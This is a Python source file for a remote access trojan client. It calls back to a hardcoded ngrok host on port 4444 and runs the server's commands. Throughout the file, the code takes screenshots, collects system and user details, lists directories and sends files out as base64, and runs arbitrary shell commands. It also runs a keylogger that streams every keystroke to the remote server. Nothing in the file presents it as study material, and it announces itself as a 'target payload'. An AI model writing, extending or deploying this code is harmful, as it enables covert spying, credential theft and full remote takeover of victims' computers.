import os
import socket
import subprocess
import platform
import json
import struct
import base64
import mss
import time
import threading
from pynput import keyboard

SERVER_IP = "triston-uliginous-terribly.ngrok-free.dev"  # سيتم استبداله تلقائياً
SERVER_PORT = 4444
command_socket = None
key_log = []
listener = None
stop_keylogger = False

def send_data(data):
    """Send data to the server."""
    global command_socket
    if command_socket:
        try:
            # Encode data as JSON
            json_data = json.dumps(data)
            # Send the length of the data first
            command_socket.send(struct.pack('>I', len(json_data.encode())))
            # Then send the data
            command_socket.send(json_data.encode())
        except Exception as e:
            print(f"Error sending data: {e}")

def recv_command():
    """Receive a command from the server."""
    global command_socket
    try:
        # Receive the length of the command
        raw_msglen = command_socket.recv(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Receive the command itself
        return command_socket.recv(msglen).decode()
    except Exception as e:
        print(f"Error receiving command: {e}")
        return None

def take_screenshot():
    """Take a screenshot and send it to the server."""
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            sct_img = sct.grab(monitor)
            
            # Convert to PNG bytes
            from PIL import Image
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()
            
            # Encode as base64 string
            img_b64 = base64.b64encode(img_bytes).decode('latin1')
            
            send_data({"type": "screenshot", "data": img_b64})
    except Exception as e:
        send_data({"type": "error", "data": f"Screenshot failed: {e}"})

def get_system_info():
    """Gather system information."""
    try:
        info = {}
        info["platform"] = platform.system()
        info["platform_release"] = platform.release()
        info["platform_version"] = platform.version()
        info["architecture"] = platform.machine()
        info["hostname"] = socket.gethostname()
        info["ip_address"] = socket.gethostbyname(socket.gethostname())
        info["processor"] = platform.processor()
        info["username"] = os.getlogin()
        
        send_data({"type": "message", "data": json.dumps(info, indent=4)})
    except Exception as e:
        send_data({"type": "error", "data": f"SysInfo failed: {e}"})

def list_files(directory="."):
    """List files in a directory."""
    try:
        files = os.listdir(directory)
        file_list = "\n".join(files)
        send_data({"type": "message", "data": f"Files in {directory}:\n{file_list}"})
    except Exception as e:
        send_data({"type": "error", "data": f"List files failed: {e}"})

def download_file(filepath):
    """Download a file from the target."""
    try:
        with open(filepath, "rb") as f:
            file_data = f.read()
        # Encode file data as base64 for JSON transmission
        file_b64 = base64.b64encode(file_data).decode('latin1')
        send_data({"type": "file_content", "filename": os.path.basename(filepath), "data": file_b64})
    except Exception as e:
        send_data({"type": "error", "data": f"Download failed: {e}"})

def execute_command(command):
    """Execute a system command."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        send_data({"type": "message", "data": output if output else "Command executed successfully."})
    except subprocess.TimeoutExpired:
        send_data({"type": "error", "data": "Command timed out."})
    except Exception as e:
        send_data({"type": "error", "data": f"Execution failed: {e}"})

def on_press(key):
    """Keylogger callback."""
    global key_log, stop_keylogger
    if stop_keylogger:
        return False
    
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            current_key = " "
        elif key == keyboard.Key.enter:
            current_key = "\n"
        elif key == keyboard.Key.backspace:
            current_key = "[BACKSPACE]"
        else:
            current_key = f"[{key}]"
    
    key_log.append(current_key)
    send_data({"type": "key_log", "data": current_key})

def start_keylogger():
    """Start the keylogger."""
    global listener, stop_keylogger
    stop_keylogger = False
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    send_data({"type": "message", "data": "Keylogger started."})

def stop_keylogger_func():
    """Stop the keylogger."""
    global listener, stop_keylogger
    stop_keylogger = True
    if listener:
        listener.stop()
    send_data({"type": "message", "data": "Keylogger stopped."})

def handle_command(command):
    """Handle a command from the server."""
    if command.startswith("TAKE_SCREENSHOT"):
        take_screenshot()
    elif command.startswith("GET_SYSINFO"):
        get_system_info()
    elif command.startswith("LIST_FILES:"):
        directory = command.split(":", 1)[1]
        list_files(directory)
    elif command.startswith("DOWNLOAD_FILE:"):
        filepath = command.split(":", 1)[1]
        download_file(filepath)
    elif command.startswith("EXECUTE:"):
        cmd = command.split(":", 1)[1]
        execute_command(cmd)
    elif command == "START_KEYLOGGER":
        start_keylogger()
    elif command == "STOP_KEYLOGGER":
        stop_keylogger_func()
    else:
        send_data({"type": "message", "data": f"Unknown command: {command}"})

def main():
    """Main function to connect and handle commands."""
    global command_socket
    send_data({"type": "message", "data": "[+] Target payload activated."})
    
    while True:
        try:
            command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            command_socket.connect((SERVER_IP, SERVER_PORT))
            send_data({"type": "message", "data": "[+] Connected to server."})
            
            while True:
                command = recv_command()
                if command is None:
                    break
                handle_command(command)
        except Exception as e:
            send_data({"type": "error", "data": f"Connection error: {e}"})
            time.sleep(5)  # Wait before reconnecting
        finally:
            if command_socket:
                command_socket.close()

if __name__ == "__main__":
    main()